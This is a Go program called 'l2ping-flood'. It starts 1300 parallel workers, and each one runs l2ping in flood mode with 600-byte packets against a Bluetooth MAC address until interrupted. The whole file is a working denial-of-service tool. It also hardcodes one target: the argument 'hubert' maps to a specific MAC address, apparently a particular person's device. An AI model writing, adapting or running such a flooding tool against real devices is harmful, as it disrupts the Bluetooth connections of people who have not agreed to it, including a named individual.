package main

import (
	"fmt"
	"os"
	"os/exec"
	"os/signal"
	"sync"
	"syscall"
)

func main() {
	if len(os.Args) != 2 {
		fmt.Println("Usage: ./l2ping-flood <MAC>")
		os.Exit(1)
	}

	macAddress := os.Args[1]

	if macAddress == "hubert" {
		macAddress = "00:1F:47:E2:25:AC"
	}

	signalChannel := make(chan os.Signal, 1)
	signal.Notify(signalChannel, os.Interrupt, syscall.SIGINT)

	done := make(chan struct{})

	var wg sync.WaitGroup

	numWorkers := 1300
	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go func(workerNum int) {
			defer wg.Done()
			pingWorker(workerNum, done, macAddress)

		}(i)
	}

	<-signalChannel
	close(done)
	wg.Wait()
	fmt.Println("All workers stopped")
}

func pingWorker(workerNum int, done <-chan struct{}, macAddress string) {
	cmd := exec.Command("l2ping", "-s", "600", "-f", macAddress)

	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	fmt.Printf("Worker %d started\n", workerNum)

	resultChannel := make(chan error, 1)

	if err := cmd.Start(); err != nil {
		fmt.Printf("Worker %d failed to start\n", workerNum)
	}

	go func() {
		resultChannel <- cmd.Wait()
	}()

	select {
	case <-done:
		if err := cmd.Process.Kill(); err != nil {
			fmt.Printf("Worker %d failed to be killed: %v\n", workerNum, err)
		} else {
			fmt.Printf("Worker %d killed\n", workerNum)
		}
	case err := <-resultChannel:
		if err != nil {
			fmt.Printf("Worker %d exited with an error: %v\n", workerNum, err)
		} else {
			fmt.Printf("Worker %d exited succesfully\n", workerNum)
		}
	}
}
